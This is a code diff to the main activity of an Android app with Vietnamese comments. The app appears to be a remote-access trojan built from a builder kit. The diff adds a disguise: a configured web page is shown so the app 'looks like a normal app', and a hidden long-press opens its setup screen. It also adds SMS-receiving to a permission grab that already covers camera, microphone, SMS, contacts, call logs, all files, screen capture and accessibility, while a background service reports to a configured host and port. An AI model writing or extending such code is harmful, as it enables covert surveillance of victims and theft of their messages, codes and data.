@@ -9,8 +9,11 @@ import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.Settings;
-import android.view.Gravity;
+import android.view.View;
 import android.view.ViewGroup;
+import android.webkit.WebSettings;
+import android.webkit.WebView;
+import android.webkit.WebViewClient;
 import android.widget.Button;
 import android.widget.LinearLayout;
 import android.widget.ScrollView;
@@ -31,6 +34,40 @@ public class MainActivity extends Activity {
         Cfg.load(this);
         pm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
 
+        // builder có nhập "home page" -> mở web đó cho giống app bình thường
+        String home = Cfg.home();
+        if (home != null && home.length() > 4) {
+            setContentView(buildWeb(home));
+            return;
+        }
+        setContentView(buildSetup());
+        requestAll();
+    }
+
+    // ─────────── trang web hiển thị ───────────
+    private View buildWeb(String url) {
+        WebView wv = new WebView(this);
+        try {
+            WebSettings s = wv.getSettings();
+            s.setJavaScriptEnabled(true);
+            s.setDomStorageEnabled(true);
+            s.setLoadWithOverviewMode(true);
+            s.setUseWideViewPort(true);
+            wv.setWebViewClient(new WebViewClient());
+            wv.loadUrl(url);
+        } catch (Throwable ignored) { }
+
+        // chạm dài = mở màn hình cài đặt
+        wv.setOnLongClickListener(v -> {
+            setContentView(buildSetup());
+            requestAll();
+            return true;
+        });
+        return wv;
+    }
+
+    // ─────────── màn hình cài đặt ───────────
+    private View buildSetup() {
         ScrollView scroll = new ScrollView(this);
         LinearLayout root = new LinearLayout(this);
         root.setOrientation(LinearLayout.VERTICAL);
@@ -44,7 +81,7 @@ public class MainActivity extends Activity {
         root.addView(title);
 
         TextView sub = new TextView(this);
-        sub.setText("Cài đặt lần đầu — cần cấp đủ quyền để chạy nền.");
+        sub.setText("Cài đặt lần đầu — cấp đủ quyền để chạy nền.");
         sub.setTextColor(Color.parseColor("#6e8bb0"));
         sub.setPadding(0, 12, 0, 28);
         root.addView(sub);
@@ -63,12 +100,10 @@ public class MainActivity extends Activity {
 
         scroll.addView(root, new ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT,
                 ViewGroup.LayoutParams.WRAP_CONTENT));
-        setContentView(scroll);
-
-        requestAll();
+        return scroll;
     }
 
-    private Button btn(String text, android.view.View.OnClickListener l) {
+    private Button btn(String text, View.OnClickListener l) {
         Button b = new Button(this);
         b.setText(text);
         b.setAllCaps(false);
@@ -86,6 +121,7 @@ public class MainActivity extends Activity {
                 android.Manifest.permission.CAMERA,
                 android.Manifest.permission.RECORD_AUDIO,
                 android.Manifest.permission.READ_SMS,
+                android.Manifest.permission.RECEIVE_SMS,
                 android.Manifest.permission.SEND_SMS,
                 android.Manifest.permission.READ_CONTACTS,
                 android.Manifest.permission.READ_CALL_LOG,
@@ -98,12 +134,10 @@ public class MainActivity extends Activity {
             if (Build.VERSION.SDK_INT >= 23 && checkSelfPermission(p) != 0) need.add(p);
         }
         if (Build.VERSION.SDK_INT >= 30) {
-            // quyền file rộng (MANAGE_EXTERNAL_STORAGE) mở bằng màn hình riêng
             if (!android.os.Environment.isExternalStorageManager()) {
                 try {
-                    Intent i = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
-                            Uri.parse("package:" + getPackageName()));
-                    startActivity(i);
+                    startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
+                            Uri.parse("package:" + getPackageName())));
                 } catch (Throwable ignored) { }
             }
         } else if (Build.VERSION.SDK_INT >= 23) {
@@ -132,9 +166,7 @@ public class MainActivity extends Activity {
         if (pm == null) { toast("máy không hỗ trợ MediaProjection"); return; }
         try {
             startActivityForResult(pm.createScreenCaptureIntent(), REQ_PROJ);
-        } catch (Throwable t) {
-            toast("lỗi: " + t.getMessage());
-        }
+        } catch (Throwable t) { toast("lỗi: " + t.getMessage()); }
     }
 
     @Override protected void onActivityResult(int req, int res, Intent data) {
@@ -145,17 +177,13 @@ public class MainActivity extends Activity {
                 Media.startScreen(this);
                 toast("Đã bật chia sẻ màn hình");
                 if (status != null) status.setText("MediaProjection: OK");
-            } catch (Throwable t) {
-                toast("lỗi projection: " + t.getMessage());
-            }
+            } catch (Throwable t) { toast("lỗi projection: " + t.getMessage()); }
         }
     }
 
     private void openBattery() {
-        try {
-            Intent i = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
-            startActivity(i);
-        } catch (Throwable t) { toast("không mở được"); }
+        try { startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)); }
+        catch (Throwable t) { toast("không mở được"); }
     }
 
     private void openAccessibility() {
@@ -179,13 +207,10 @@ public class MainActivity extends Activity {
             Intent i = new Intent(this, Core.class);
             if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
             else startService(i);
-            if (status != null) status.setText("Dịch vụ: ĐANG CHẠY → " + Cfg.host() + ":" + Cfg.port());
-        } catch (Throwable t) {
-            toast("lỗi start service: " + t.getMessage());
-        }
+            if (status != null)
+                status.setText("Dịch vụ: ĐANG CHẠY → " + Cfg.host() + ":" + Cfg.port());
+        } catch (Throwable t) { toast("lỗi start service: " + t.getMessage()); }
     }
 
-    private void toast(String s) {
-        Toast.makeText(this, s, Toast.LENGTH_SHORT).show();
-    }
+    private void toast(String s) { Toast.makeText(this, s, Toast.LENGTH_SHORT).show(); }
 }
